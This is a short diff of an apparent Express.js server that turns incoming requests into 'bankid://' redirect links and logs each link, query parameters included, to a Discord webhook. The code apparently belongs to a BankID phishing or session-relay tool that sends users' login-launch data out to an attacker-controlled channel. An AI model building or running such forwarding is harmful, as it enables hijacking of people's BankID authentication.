@@ -12,7 +12,7 @@ app.use(express.json());
 
 app.get('/', (req, res) => {
   // Construct the redirect URL with all query parameters
-  const redirectUrl = `bankid:///${req.originalUrl}`;
+  const redirectUrl = `bankid://${req.originalUrl}`;
 
   // Log the redirect URL to Discord webhook
   sendDiscordWebhook(redirectUrl);
